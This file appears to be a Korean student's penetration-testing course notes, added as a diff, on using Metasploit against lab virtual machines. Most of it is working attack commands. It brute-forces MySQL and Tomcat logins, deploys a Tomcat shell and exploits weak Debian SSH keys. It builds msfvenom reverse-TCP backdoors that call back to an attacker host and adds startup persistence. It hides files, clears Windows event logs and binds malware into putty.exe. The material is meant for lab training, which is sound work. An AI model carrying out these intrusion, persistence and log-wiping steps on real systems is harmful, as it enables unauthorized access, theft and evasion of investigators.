@@ -1,0 +1,2218 @@
+
+=========================metaspolit모의해킹!===============================
+
+메타스플로잇 : 루비언어 사용 하는 프레임워크
+프레임워크 = 개발하는환경 하지만 이거는 개발에 관한 것을 말하는것 
+			 플랫폼은 하드웨어 적인 성격을 가짐  기반시설을 가지는 것
+
+SET 사회공학적 기법 프레임워크
+
+beef-xss 브라우저 해킹하는 프레임워크 msf체계를 사용 
+
+암호크랙 존 존더리퍼 히드라
+
+exploit-db  사이트에있는 코드를 프로그램으로 만들어 놓음 
+
+
+1. 메타스플로잇 개요
+	- 루비 언어로 개발 (일본에서) 스크립트를 개발하는것으로 파이썬이나 펄을 사용 했지만 루비를사용해서 편하게 만듬
+		루비는 웹프로그램에 좋음
+		루비는 동적 객체 지향 스크립트
+		서버앞단 = 자바, JSP, ASP 등을 사용 프론트엔드에선
+		서버뒷단 = 다른서버와 연동할때 사용하는것 백엔드 JSP,ASP 등 사용하지만 루비나 파이썬 펄 을 이용한 스크립트를 사용하는사람도 잇음
+	- POC = 버그가 존재하는지만 확인하는 정도의 코드
+	- 메타스플로잇 = 모의해킹을 할 수있는 많은 코드들이 들어있는 프레임워크
+	- 취약점 진단 통합 프레임워크 
+	- 유료와 무료 버전이있음 상용제품을쓰면 웹에서 사용할수있음 기능제한은 없음
+	- 취약성 = Vulnerability
+	- 익스플로잇 = exploit 
+	- 페이로드 = payload -> 상대편을 제어 (백도어)
+
+2. 칼리리눅스에서 MSF 서비스 접근
+	- postgreSQL -> msf결과를 db에 자동으로 넣어주기 때문에 사용해야함 아주작은 리소스를 가짐 postgreSQL은
+	
+	[사용법]
+		# msfdb init -> 초기에 한번 초기화 작업을 해야함 
+		# service postgresql start 
+		# msfconsole 
+	
+	[실습] 
+		개요 : DB(EX: msf)를 생성
+			   접속할 때 사용하는 사용자 계정(EX: msf)와 암호를 설정
+			   접속 설정(EX: DB 종류, IP, PORT 등)을 한다.
+		
+		# msfdb 
+		# msfdb init 
+		# cat /usr/share/metasploit-framework/config/database.yml 
+		# systemctl start postgresql (# service postgresql start)
+		# systemctl status postgresql 
+		# systemctl enable postgresql
+		# service  --status-all			시작시 올라오는것 확인하는것
+		# systemctl list-unit-files 	시작시 올라오는것 확인하는것
+		# msfconsole 
+			> help
+			> db_status -> 커넥트되어있음 안되어있으면 서칭속도가 떨어짐 
+
+3. 메타스플로잇 구성요소
+	(라이브러리 종류)
+		Rex 	 	: 루비란 언어로 만들어진 기능들임 
+		msf Core 	: 루비나 Rex로 만들어짐
+		msf Base	: 루비나 Rex나 Core로 만들어짐
+	
+	(모듈의 종류) -> 각각 하나하나의 코드를 모듈이라함 여기서는
+		exploits => 페이로드가 붙는 코드를 익스플로잇 안붙으면 auxiliary 임 ex)포트스캐닝,취약성진단
+		
+		payloads => 원격에서 실행할 수 있는 코드
+					# msfvenom -h
+					
+		incoder  => 인코딩 디코딩 할 때 사용 보안장비를 페이로드를 감지하는 경우가있음 이때 인코딩을 해서 감지를 못하게 함
+					# msfvenom -l encoders
+		
+		nops     => 아무역할x ex)null , 인코딩 처럼 av제품 우회 ips가 읽는 값에 nops를 넣어 바이러스라고 생각 못하게 함
+					페이로드에 붙여서 실행할수있는확률을 높임 리턴주소값을 나의 코드로 바꿔서 주소가 임의로 선택하기 때문에 null값을 많이넣고 이후 조그마하게 나의 코드를 붙여서 실행확률을 높이는것
+		
+		auxiliary -> 취약점진단
+	 
+		(인터페이스 종류)
+			msfconsole (CLI) -> 대화형 모드
+			msfcli 사라짐 -> msfvenom(msfcli+msfpayload+msfincoder)
+			msfgui 사라짐 
+			Armitage (GUI) -> msfgui 툴과 비슷한 툴이다.
+	
+	[실습]  Metasploitable - Virtual Machine to Test Metasploit
+		취약한 서버 구축 : https://information.rapid7.com/download-metasploitable-2017.html 다운로드
+		ID	:msfadmin
+		PASS:msfadmin
+		(msf서버)
+			$ hostname
+			$ unma -a
+			$ cat /etc/lsb-release
+			$ lsb_release -a
+			$ ifconfig			-> 10.134 번으로 맞춤
+			$ netstat -nr 
+			$ cat /etc/resolve.conf
+				● IP/Netmask   : 192.168.10.134/255.255.255.0
+				● Defaultrouter: 192.168.10.2
+				● DNS          : 192.168.10.2			-> 이런식으로 설정 맞추기 
+			$ sudo vi /etc/network/interfaces 
+				[수정전]
+				auto eth0
+				iface eth0 inet dhcp
+				[수정후]
+				auto eth0
+				iface eth0 inet static
+				address 192.168.10.134
+				netmask 255.255.255.0
+				gateway 192.168.10.2
+			$ exit
+	
+	[실습]  Metasploit Framework 디렉토리 구조 확인
+		(칼리)
+			# cd /usr/share/metasploit-framework/ 
+			# ls 
+				# cd data -> 아이디패스워드에 관련 딕션어리 파일 # cd wordlists 에 사전파일이 있음
+				# cd ../../lib	-> 코드들이 들어가있음
+				# cd ../plugins/ -> 연동하는 ui들을 만들어놓음
+				# cd ../scripts  -> meterpreter 가 유용함 개발해서 넣으면 meterpreter에서 사용가능 
+			# cd modules 	-> 각 모듈 코드들이 들어가있음 
+			# ls 
+			# cd auxiliary
+			# ls 
+			# cd dos/tcp
+			# ls 
+			# cat synflood.rb 
+	
+	[실습]  msfconsole 간단한 사용법 익히기
+		(칼리)
+			# msfconsole -h 
+			# msfconsole -v 
+			# msfconsole
+				> help
+				> help search
+				> help show		show -h 와 동일
+				> show exploits 익스플로잇 코드들을 보여줌 
+				자동완성 쌉가능
+	
+	[실습] msfconsole core CMD 사용법 익히기
+		(칼리)
+			# msfconsole -q 
+				(back 명령어)
+					> help back
+					> search web_pii
+					> use vsploit/pii/web_pii 
+					> back
+				
+				
+				(banner 명령어)
+					> help banner
+					> banner
+								
+				(check 명령어)
+					> help check -> 안나온다 이거는 프로그램 내에 check함수가 있어야함 모듈안에 다 있음 따라서 점검할때 사용하는것 
+					> search ms08_067_netapi -> 윈7 의 버그공격 코드 
+					> use exploit/windows/smb/ms08_067_netapi
+					> check -> rhost가 없어서 오류
+					> set options
+					> set rhost 192.168.10.134
+					> set options	-> rhost가 있는것을 확인
+					> check ->공격이안된다고 뜸 이유는 윈7취약점가지고 리눅스공격하려고해서그런것임 이렇게 쓰는것만 알아두기 
+				
+				(color 명렁어)
+					> help color
+					> color auto
+				
+				(edit 명렁어)
+					> help edit
+					> search rlogin_login
+					> use auxiliary/scanner/rservices/rlogin_login
+					> edit		-> 위에 경로에 있는 rlogin_login.rb파일을 바로 볼수있음
+				
+				(info 명령어)
+					> help info
+					> search rlogin
+					> info auxiliary/scanner/rservices/rlogin_login
+					> use auxiliary/scanner/rservices/rlogin_login
+					> info 
+					> back 
+			
+				(irb 명령어) 루비 쉘을 열어주는 명령어임		파이썬과 펄의 합  -> 세션연결후 상대방에 컴퓨터에 코드를 작성할때 사용
+					> help irb
+					> irb
+						>> puts "hello, metasploit!" 
+						>> Framework::Version 
+						>> quit 
+				
+				(jobs 명령어) 
+					[1터미널]
+						> help jobs		여기서 jobs는 상대편과 연결된 관계 
+					[2터미널]
+						# mkdir -p /root/bin 
+						# cd /root/bin 
+						# vi reverse_resource.rc 
+							use exploit/multi/handler
+							set PAYLOAD windows/x64/meterpreter/reverse_tcp
+							set LHOST 192.168.20.50
+							set ExitSession false
+							exploit -j -z
+					[1터미널]
+						> resource /root/bin/reverse_resource.rc 	2터미널 내용이 한번에 실행이됨 
+						> jobs
+						> jobs -K 누르면 종료
+						> jobs
+				
+				(kill 명령어)
+					> help kill
+					> jobs
+					> kill 0	-> 0은 job의 id임 
+					> jobs
+					
+				(resource 명령어)		-> 안에서 치려고 하는 명령어를 만들고  리소스로 돌리면 한번에 실행이됨 
+					> help resource
+					> resource /root/bin/reverse_resource.rc
+					> exit	-> msf콘솔이 종료되고 그안에 돌던게 다 종료가 됨
+					> echo version > version.rc		파일 만듬
+					> msfconsole -q -r version.rc 	리소스파일로 버전파일을 실행하면 들어가자마자 version친게 됨 
+					> msfconsole -q -r /root/bin/reverse_resource.rc	리소스파일로 해당파일을 실행하고 시작
+					> jobs 보면 하나 돌아가고있음
+			
+				(route 명령어)
+					meterpreter 에서 route 쓰는것임
+					
+				(search 명령어)
+					> help search 
+					> search usermap_script 		이거 들어간거 다찾기
+					> search name:mysql 			이름에 이거들어간거찾기
+					> search platform:aix 			플랫폼이 aix인거
+					> search type:post 				타입이 post인것 
+
+				(sessions 명령어)	-> jobs는 백그라운드에서 리슨상태로 돌아가는것 연결이 된지 안된지 모르는것 하지만 세션이 연결되면 jobs로 안나옴 sessions -l 해야지 나옴
+					> help sessions 
+					> sessoins -l
+
+				(set/unset 명령어)
+					> help set
+					> help unset
+					> search wuftpd 
+					> use exploit/multi/ftp/wuftpd_site_exec_format
+					> show options 
+					> set RHOST 192.168.10.134 
+					> set FTPPASS jang4sc@hanmail.net 
+					> show options 
+					> unset RHOST 
+					> show options 
+					> unset all 		-> 함부러 하지 말기 
+					> set 
+					> back 
+				
+				(show 명령어)
+					> help show
+					> use exploit/multi/ftp/wuftpd_site_exec_format 
+					> show options 
+					> show targets 
+					> show advanced 
+					> set 
+			
+	[실습] zenmap을 통해 포트스캔된 정보를 MSF에서 읽어 들이기
+		필요한이유 : msf콘솔에서 nmap을 사용할수있다 이렇게하면 postgresql에 저장이 자동으로 된다 
+		
+		(칼리)
+			# zenmap &
+				-> Target  : 192.168.10.134  
+				-> Profile : 'Quick scan plus' 선택
+				-> 스캔 시작	
+				-> 스캔 결과를 파일로 저장: /root/scan1.xml 
+					scan > save scan
+				-> 스캔 과정이 끝났다면 zenmap를 종료한다.
+			# msfconsole -q
+				> help 
+				> help db_import
+				> db_import /root/scan1.xml		-> import완료 
+				> host	-> 호스트나옴
+				> services -> 스캔한 포트나옴
+				> notes
+				> search portscan
+				> use auxiliary/scanner/portscan/syn 
+				> show options
+				> set PORTS 1-500 
+				> set RHOSTS 192.168.10.134
+				> run 
+				> quit
+				
+	[실습] 사전 파일을 이용한 MySQL 원격 로그인 시도 	
+		(칼리)
+			# nmap -sV 192.168.10.134
+			# msfconsole 
+				> search mysql_login 
+				> use auxiliary/scanner/mysql/mysql_login
+				> show options 
+				> set RHOSTS 192.168.10.134
+				> run -> 아이디비번을 설정해달라!
+		[터미널2]
+			# vi /usr/share/metasploit-framework/data/wordlists/user.txt
+				admin
+				administrator
+				root
+				soldesk
+			# echo "" > pass.txt	-> 비밀번호가 없는상태가 기본값이라서 이렇게 함
+		(칼리)
+				> set user_file /usr/share/metasploit-framework/data/wordlists/user.txt
+				> set pass_file /usr/share/metasploit-framework/data/wordlists/pass.txt
+				> run
+				> set stop_on_success true	성공하면 멈추도록 설정
+				> run
+			# mysql -h 192.168.10.134 -u root -p
+				> show databases;
+				> show tables;
+				> desc user;
+				> select host,user,password from user;		select * from user\G 세로로 다 보여줌 모든 컬럼을 
+
+	[참고] login 프로그램 검색하는 법 
+		# cd /usr/share/metasploit-framework/modules/auxiliary/scanner
+		# find . -name "*_login.rb" -type f 
+		#
+	
+	[실습] exploit-db.com을 이용한 tikiwiki 취약점 공격
+		선수 작업 - tikiwiki 사이트 설정(tikiwiki 설정 + DB 생성)
+		
+		(칼리)
+			# firefox http://192.168.10.134/tikiwiki/tiki-index.php &
+				Database	Type : MySQL
+				Host	     : localhost
+				User          : root
+				Password      :
+				Database name : tikiwiki195	
+	
+				-> Create	
+			
+				# firefox http://192.168.10.134/tikiwiki/tiki-index.php & 화면 바뀐것 확인
+	
+		(메타)
+			$ mysql -u root -p
+			<enter>
+			show databases;
+			use tikiwiki195
+			show tables
+			select * from users_users\G	-> 서버생성된걸 확인
+		
+		[실습부분]
+			(칼리)
+				# nmap -sV -p 1-65535 192.168.10.134 
+				
+				# firefox http://192.168.10.134
+					-> Twiki 
+					
+				# powerfuzzer &	-> 파일 디렉토리 목록보는 용도임
+					-> Target URL : http://192.168.10.134
+					-> scan : twiki 사용하는것을 알 수있음
+					
+				exploit-db.com 에서 tikiwiki 검색
+					2006-11-01 버그를 확인
+					/tiki-listpages.php?offset=0&sort_mode= 복사
+					
+				http://192.168.10.134/tikiwiki/tiki-listpages.php?offset=0&sort_mode=	들어가면 밑에 db오류가 나옴
+					root를 찾아보기 그러면 비밀번호가 없는걸 확인함 
+				
+				# ssh msfadmin@192.168.10.134 
+				
+				$ export TERM=vt100 
+				
+				$ mysql -u root -p
+					> show databases;
+					> use tikiwiki195 
+					> show tables; 
+					> select * from users_users\G
+					> select login,password from users_users;		아이디 비밀번호 확득함 
+					> exit
+				
+				# firefox http://192.168.10.134/tikiwiki/tiki-index.php &
+					admin
+					admin 접속
+		
+	[실습] Root SSH Key Crack(CVE 2008-0116)
+	
+		[암호화 알고리즘]
+			대칭형 암호(비밀키 암호) : 파일 디렉토리 암호화 할때 많이씀 
+			
+				블럭 암호 알고리즘   : 블록 단위로해서 매우 빠른 암호화
+					DES/3DES 		 : 쓰면안됨 크랙됨
+					AES				 : 가장 많이사용
+					SEED    		 : 한국에서 만든 것
+					
+				스트림 암호 알고리즘 : 블록단위가아니라 스트림으로 암호를 하는 알고리즘
+					RC4				 : 크랙이 됨 잘 안쓰려고 함 
+				
+			비대칭형 암호(공개키 암호)   : RSA/DSA
+				암호화와 복호화 키가 다르다
+				단점으로 속도가 좀 떨어진다
+				통신할때 사용하면 좋다 -> 하이브리드 방식으로 섞어서 사용한다
+				
+			해시 암호(단방향 암호)       : MD5, SHA
+				단방향 알고리즘 방식
+				암호화된 것을 암호화해서 암호를 생성할때
+				파일의 무결성 
+		
+		[비대칭형 암호] 
+			공개키 -> 암호화,복호화
+			개인키 -> 복호화,암호화 
+			전자서명 : 공개키 복호화 개인키 암호화 
+			
+		[실습]
+			db를 먼저 크랙후 db에있는 ssh키쌍을 얻어와서 내가 가지고있는 키쌍과 비교해 적당한 키쌍을 획득 
+			
+			http://www.exploit-db.com
+				오른쪽 상단의 filter 을 선택 -> Advanced 선택
+					-> CVE 번호: CVE-2008-0166 으로 검색한다.
+					-> 2008-06-01
+			
+			주석에 사용법을 읽는다
+			
+			(칼리)
+				# cd /var/tmp
+				# wget --no-check-certificate \
+				https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 
+				# tar -xvjf 5622.tar.bz2
+				# cd /rsa/2048
+			
+			(메타스플로잇)
+				$ sudo su -
+				# passwd 
+					-> soldesk1.
+			
+			(칼리)
+				# nmap -sV 192.168.10.134
+				# msfconsole -q
+					> search postgresql_login
+					> use auxiliary/scanner/postgres/postgres_login
+					> show options
+					> set rhosts 192.168.10.134
+					> set stop_on_success true
+					> run		
+						192.168.10.134:5432 - Login Successful: postgres:postgres@template1	가 나옴
+				# psql -h 192.168.10.134 -U postgres	
+					post# help
+					post# select version();
+					post# select * from pg_user;							-> usesuper 가 t임
+					post# create user hacker with password 'abc123';		-> 사용자 추가 	
+					post# select * from pg_user;							-> usesuper 가 f임
+					post# alter user hacker with superuser;					-> usesuper 가 t로바뀜
+					post# select * from pg_user;
+					post# \dn												모든 스키마(schemas) 출력
+					post# \l												모든 데이터베이스(databases) 출력
+					post# create table accounts (linux_users text);			accounts 테이블 생성 text로 만들면 크기가 자유로움
+					post# copy accounts from '/etc/passwd';
+					post# select * from accounts where linux_users like '%bash%'; 
+					post# create table sshkeys (auth_key text);
+					post# select * from accounts where linux_users like '%bash%';
+					post# copy sshkeys from '/root/.ssh/authorized_keys';
+					post# \q
+				# cd /var/tmp/rsa/2048 
+				# psql -h 192.168.10.134 \
+				-U postgres \
+				-c 'select * from sshkeys limit 1' | tee sshkeys.txt											-> c옵션으로 치고 나오는것임 키를 넣은것을 확인하고 탈출함
+				# cat sshkeys.txt																				-> 내용보고 필요한 곳만 가져와야함 
+				# grep "ssh-rsa" sshkeys.txt | awk '{print $2}'													-> 중요문 가져오기
+				# grep "ssh-rsa" sshkeys.txt | awk '{print $2}' | sed 's/==$//'									-> 맨뒤 ==를 공백으로 바꾸기 sed명령어로 
+				# fgrep `grep "ssh-rsa" sshkeys.txt | awk '{print $2}' | sed 's/==$//'` *.pub | tee keys.txt 	-> fgrep 으로 위에 문을 넣고 *.pub를 통해 공개키랑 비교를 해본다 현재폴더 밑에 공개키랑 그럼 결과가 나옴 
+				# cat keys.txt																					-> 위에 결과가 나온값이 공개키기 때문에 .pub를 빼면 개인키임 그걸 찾음
+				# cat keys.txt | awk -F: '{print $1}' | sed 's/.pub//'											-> 해당 .pub를 빼는 명령어 
+				# ssh -i `cat keys.txt | awk -F: '{print $1}' | sed 's/.pub//'` root@192.168.10.134 			-> 이러면 바로 접속이 가능 퍼블릭에대한 개인키를 위에서 추출했기 때문에 
+				# ssh -i `cat keys.txt | awk -F: '{print $1}' | sed 's/.pub//'` root@192.168.10.134 "hostname;id" -> 이렇게도 접속이 가능
+				# vi /root/bin/ssh_cmd.sh
+					#!/bin/bash
+					ssh -i `cat keys.txt | awk -F: '{print $1}' | sed 's/.pub//'` \
+					root@192.168.10.134 $*
+				# chmod 700 ssh_cmd.sh
+				# ./ssh_cmd.sh id
+		
+	[실습] 위에 프로그램 스크립트 작성
+		#!/bin/bash
+			if [ $# -le 0 ] ; then
+   			echo "Usage: $0 <CMD>"
+   			exit 1
+		fi
+		
+		cd /var/tmp/rsa/2048
+		export PGPASSWORD='postgres' 
+		psql -h 192.168.10.134 \
+   			-U 'postgres' \
+   			-c 'select * from sshkeys limit 1' \
+		    | grep "ssh-rsa" \
+   			| awk '{print $2}' \
+   			| sed 's/==$//' \
+   			> sshkey2.txt
+
+		KEY_FILE1=$(fgrep -l $(cat sshkey2.txt) *.pub | awk -F: '{print $1}' | sed 's/.pub$//')
+		ssh -i $KEY_FILE1 root@192.168.10.134 $*
+		
+	[실습] exploit.py 프로그램을 사용한 root ssh key crack (CVE 2008-0116)
+			https://www.exploit-db.com/exploits/5720	-> 에서 코드복사
+			# vi /root/bin/exploit.py 					-> 붙여넣기
+			# python /root/bin/exploit.py 				-> 실행해보기 
+			# python /root/bin/exploit.py `pwd` 192.168.10.134 root 22 5
+			# ssh -lroot -p 22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.10.134 	-> 키가 나오면 접속하기 
+
+	[실습] HTTrack 툴을 이용한 사이트 클론(Clone) 구성
+		powerfuzzer : 웹디렉토리 목록과 파일 목록화(크롤링, spider)
+		HTTrack     : 웹디렉토리 목록과 파일 목록화 + 파일 다운로드(site cloner)
+		
+		(칼리)
+			# apt-get update 
+			# apt-get install httrack 
+			# mkdir /mywebsites 
+			# cd /mywebsites 
+			# httrack 
+				example.com 
+				/mywebsites
+				192.168.10.134  
+				2
+				[ENTER]
+				[ENTER]
+				[ENTER]
+				Y
+			[터미널2]
+			# cd /mywebsites 
+			# ls 
+			# cd example.com
+			# ls 
+			# cd 192.168.10.134 
+			# ls
+			# cd twiki 
+			# find .        (# find . | wc -l)
+			# ln -s /mywebsites/example.com/192.168.10.134 /var/www/html/test 
+			# service apache2 restart 
+			# firefox http://192.168.10.50/test &
+				-> clone site 웹페이지 확인
+			# firefox http://192.168.10.134 &
+				-> original site 웹페이지 확인
+	
+	[실습] Tomcat 취약점 공격
+		(칼리)
+			# nmap -sV -p 1-65535 192.168.10.134
+			# firefox http://192.168.10.134:8180/ &
+			# firefox http://192.168.10.134:8180/manager/html &			-> (주의) 반드시 이 창을 닫으면 안된다.
+			# msfconsole 
+				> search tomcat 
+				> use auxiliary/scanner/http/tomcat_mgr_login
+				> show options 
+				> set rhosts 192.168.10.134
+				> set rport 8180
+				> run
+			# firefox http://192.168.10.134:8180/manager/html &			-> (주의) 실행했던 firefox 종료하면 안된다.
+				아이디 : tomcat
+				비번   : tomcat
+		
+			# msfconsole 
+				> search tomcat 
+				> use exploit/multi/http/tomcat_mgr_deploy
+				> show options 
+				> set HttpPassword tomcat
+				> set HttpUsername tomcat
+				> set rhost 192.168.10.134
+				> set rport 8180
+				> show payloads 
+				> set payload java/shell/bind_tcp
+				> show options
+				> exploit 
+					hostname 
+					dir 
+					cat /etc/passwd 
+					id 
+					find / -user tomcat55 2>/dev/null | egrep -v /proc 
+					which gcc 
+					cd /tmp 
+					echo '#include<stdio.h>' > test.c
+					echo 'main() {  printf("hello\n"); }' >> test.c 
+					gcc -o test test.c 
+					./test 
+					exit 
+					<ENTER>
+		
+	[참고] bind 와 reverse 차이
+		bind
+			서버는 공인ip를 가지고있음 
+			공격자는 사설ip를 가지고있음 but 상관은 없음 상대편 사이트에 붙을수만있으면
+			서버를 공격할때 서버에 올리는 파일로는 bind tcp를 사용 
+			bind tcp는 서버에 올리고 실행하면 데몬처럼 계속 listen상태로 있음 따라서 공격자는 listen상태에 붙을것만 있으면 됨 
+			bind는 서버에서 공인 ip로 어디서나 서비스하기 때문에 항상 listen이기 때문에 서버에공격할때 사용
+		
+		reverse
+			reverse 는 공격 대상이 pc임 따라서 공인이아니라 사설 ip를 가지고있음 
+			상대 pc에 올리는 파일로는 reverse사용 
+			상대 컴퓨터에 악성코드를 넣고싶다 
+			공격자가 공인 ip로 설정되어있어 listen상태로 있는다 
+			상대 pc에 reverse를 넣어 상대가 실행을 하게 되면 listen상태로되어있는곳에 세션이 이루어짐
+		
+	[참고] shell 과 meterpreter 차이
+		shell
+			shell 은 운영체제 내에 저장된 명령어를 말한다 ls나 윈도우에선 dir 이나 systeminfo
+			쉘은 연결이 되고나면 운영체제 native커맨드를 통해서 제어를 해야한다 유닉스는 유닉스 윈도우면 윈도우 리눅스는리눅스 
+		meterpreter 
+			루비 기반의 스크립트를 통해서 침투한 후 간단한 명령어를 통해 정보를 획득할수있는 기능
+			여러 장비에 명령어를 잘 모르기 때문에 ls를 치면 연결된 운영체제가 윈도우면 dir로 바뀐다 
+			이렇게 공격자가 공격대상에 쉽게 접근하는 인터페이스 역할을 한다 
+
+	
+	[실습] Meterpreter 이용한 Reverse TCP 공격	-> 위 실습에서 일반사용자 까지 공격을했음 
+
+		시스템 침투 환경을 만들기 위해 백도어를 이용하여 테스트 환경을 만드는 실습을 진행한다.
+
+		---- Attacker ----		---- Victim ----
+		(KaliLinux) 공인IP		(Window 7) 사설IP
+		(ㄱ) Program(listen)
+								(ㄴ)악성프로그램(execute)
+		------------------		-----------------
+		
+		(칼리) 
+			# ifconfig | grep inet 
+			# mkdir -p /root/bin 
+			# cd /root/bin
+			# vi reverse_resource.rc			-> 포트 지정이없으면 4444로 붙음 
+				use exploit/multi/handler
+				set PAYLOAD windows/x64/meterpreter/reverse_tcp
+				set LHOST 192.168.20.50
+				set ExitSession false
+				exploit -j -z
+			# cd /root/bin 
+			# msfvenom -l payloads | grep windows | grep meterpreter | grep reverse_tcp 	-> 윈도우에 설치할 프로그램을 위해 검색해봄
+			# msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options 				-> basic 옵션만 확인하면 됨 lhost설정해줘야한다는걸 알 수 있음 
+			# msfvenom --list formats														-> 포맷을 지정하는 옵션 윈도우니깐 exe포맷으로 해야함 
+			# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.50 LPORT=4444 -f exe -o reverse_test.exe -> 사용한 reverse_tcp는 위에랑 같은것 해야함
+			# ls reverse_*
+			# file reverse* 
+
+	(가정) 여러가지 방법을 통해 reverse_test.exe 파일을 대상 PC에 복사했다고 가정한다.
+	
+		[공유폴더를 열음]
+		(칼리)
+			# mkdir -p /share 
+			# chmod 777 /share 
+			# cp reverse_test.exe /share 
+			# vi /etc/samba/smb.conf 
+				[share]
+				comment = Kali Linux Shared Directory
+				path = /share
+				browseable = yes
+				read only = no
+				writable = yes
+				public = yes
+			# service smbd restart 
+			# service smbd status 
+			# smbclient -L localhost -N 
+
+		[공유폴더에서 파일 가져옴]
+		(윈7)	
+			\\192.168.20.50\share\resource_test.exe ---> 바탕화면으로 복사
+		----------------------------------------------------------------------------여기까지 위에 가정역할 
+		(칼리)
+			# cd /root/bin 
+			# msfconsole -r reverse_resource.rc 	
+				use exploit/multi/handler
+				set PAYLOAD windows/meterpreter/reverse_tcp
+				set LHOST 192.168.20.50
+				set ExitSession false
+				exploit -j -z			-> 해당내용 실행
+				> jobs
+				> sesseions
+				> show options
+		(윈7)
+			window 7 시스템에서 reverse_test.exe 파일 실행		
+		
+		(칼리) KaliLinux에서 메세지 확인	-> 세션이 연결된것 확인
+				<ENTER>
+				sessions -l 
+				sessions -i 1	-> id번호를 적어주면 해당 세션으로 들어갈 수 있음 meterpreter 로연결된걸 알 수 있음 
+					help		
+					sysinfo 
+					ipconfig 
+					route 
+					getuid 
+					pwd
+					lpwd 
+					ls 
+					download
+					download -r test /root/bin 	-> 윈도우에서 test폴더만들고 파일 몇개 만든 후 실행 
+					pwd 
+					cd ..
+					pwd
+					cd AppData
+					cd Roaming
+					cd Microsoft
+					pwd
+					cd Windows
+					cd "Start Menu"
+					cd Programs
+					pwd
+					cd Startup
+					pwd
+					upload reverse_test.exe .	-> 를해서 시작할때마다 실행을 시켜 연결이 자동으로 된다 
+					reboot						-> 윈7 재부팅됨
+					<ENTER>
+					quit
+					resource reverse_resource.rc 
+						use exploit/multi/handler
+						set LHOST 192.168.20.50
+						set ExitSession false
+						exploit -j -z
+			
+		(윈7) -> 로그인 
+			로그인 할 때 악성 프로그램(EX: reverse_test.exe)이 실행 될것이다.
+	
+		(칼리)
+				<ENTER>
+				sessions -l  
+				sessions -i 1
+				shell 
+				cd "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp"	들어가기
+				dir			-> 깨짐
+				chcp 437	-> 현재는 949 따라서 437로 바꿔 영어로 바꿔서 하면 잘 안깨진다 
+				attrib /?	
+				attrib +h +r +s reverse_test.exe	-> 해당 파일을 숨기는 역할을 한다 -> 윈7에서 폴더옵션에 보호된 운영체제 파일 숨기기와, 알려진 파일 형식의 파일 확장명 숨기기를 언체크 하면 볼 수 잇다
+				attrib -h -r -s reverse_test.exe
+				exit
+				quit
+				quit
+		(복원)
+			윈7 시작 프로그램 지우기 
+			
+	[실습] Meterpreter - shell 이용한 윈도우 2008 R2 로그 삭제
+		실습개요 : 악의적인 사용자(EX: hacker)가 시스템에 침입하고 권한을 얻고 나면, 기존에 기록된 로그를 삭제한다. 이러한 과정을 시뮬레이션 해 보자.
+			1) OS Native Command : wevtutil CMD 
+			2) Open Source : log-liller 
+			3) msf 체계 : msfconsole > meterpreter > system command > clearev script 
+			
+		(윈2008)
+			시작 > 관리도구 > 이벤트 뷰어 > Windows 로그 > (응용프로그램|보안|Setup|시스템)		= 로그확인 
+		(칼리)
+			# cd /root/bin
+			# cp reverse_resource.rc reverse_resource2.rc
+			# vi reverse_resource2.rc
+				use exploit/multi/handler
+				set PAYLOAD windows/x64/meterpreter/reverse_tcp
+				set LHOST 192.168.20.50
+				set ExitSession false
+				exploit -j -z
+			# msfconsole -r reverse_resource2.rc 
+			# cd /root/bin
+			# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.50 LPORT=4444 -f exe > backdoor.exe 
+			# ls backdoor*
+			# cp backdoor.exe /var/www/html
+			# serveice apache2 restart
+			# pgrep -lf apache
+		(윈2008)
+			윈도우 웹에 192.168.20.50/backdoor.exe 하면 다운받아짐
+		(칼리)
+			sessions -i 1 
+			help 
+			getuid 
+			getsystem -h 
+			getsystem 		-> 중요한 메시지 administrator 는 관리자이지만 관리자권한으로 cmd를 실행할수있음 작업관리자를 열어 사용자이름이 system인것이 가장 강력한것 
+			getuid  
+				shell 														-여기부터
+					wmic process list brief | find "winlogon"
+					exit
+				migrate 488
+				getuid														-여기까진 위에 getsystem명령어가 안먹히면 사용하는것
+			shell 
+				wevtutil.exe el 				-> 로그 카테고리를 말함 왼쪽창을 다 펼처놓은것 윈2008과 비교 
+				wevtutil.exe cl "System" 		-> system의 로그를 지움 
+				wevtutil.exe cl "Application"	-> 
+				wevtutil.exe cl "Security"
+				wevtutil.exe cl "Setup"
+		(윈2008)
+			시작 > 제어판 > 관리도구 > 이벤트 뷰어 > Windows 로그 > (응용프로그램|보안|Setup|시스템)
+		(칼리)
+				exit
+			quit
+			quit
+	
+	[실습] 로그 삭제 open source 툴 : log-killer
+		(윈2008)
+			https://github.com/Rizer0/Log-killer -> 다운로드 및 압축해제 
+			스크린샷 보기
+			logkiller.bat 윈도우 서버에서 실행하는 파일
+			cleartracks.php 는 리눅스 서버에서 실행하는 파일 
+	
+	[실습] clearev(meterpreter) 안에 있는 것 을 사용
+		(칼리)
+			# cd /root/bin
+			# msfconsole -r reverse_resource2.rc
+		(윈2008)
+			바탕화면 backdoor exe 실행
+		(칼리)
+				sessions -i 1
+				help
+				clearev
+					-> app, system, security 지워짐 
+	
+	[정리] 로그 지우는 방법
+		(ㄱ) OS native command 사용 : wevtutil.exe el/ wevtutil.exe cl
+		(ㄴ) Open Source 툴 : Log-killer 
+		(ㄷ) MSF 체계 : meterpreter > clearev 
+	
+	[실습] Backdoor Factory 이용한 악성 코드 제작(악성 코드를 은닉하는 경우)
+		putty.exe + reverse_tcp = putty.exe 만듬 악성코드가 들어가있는것임 -> 압축 해제를 하면 두개다 실행 따라서 putty는 포그라운드 악성코드는 백그라운드 
+			합치는법 
+			1. 각 프로그램마다 메타정보가 있는데 합치면 합친 메타정보가 생성 따라서 새로생성된 메타정보가 각각 메타정보를 가르켜 실행을 할수있게 동작
+			2. 만약 putty가 엄청나게 크다면 악성코드를 그냥 putty에 넣을 수 있음 따라서 큰 정보의 메타정보가 각각 가르킨다 
+			3. 두개를 압축해서 압축에 대한 메타정보가 있을것 그리고 각각 파일에 메타정보가 있을것 1번과 비슷하지만 압축하고 새로운 autorun이란 파일을 만들어 이 파일이 a의 메타정보와 b의 메타정보를 가르켜 해제하자 마자 바로 실행하게 하는것 악성코드는 백그라운드로 그냥 프로그램은 포그라운드로 돈다. 따라서 판단이 어려움 
+		code cave?
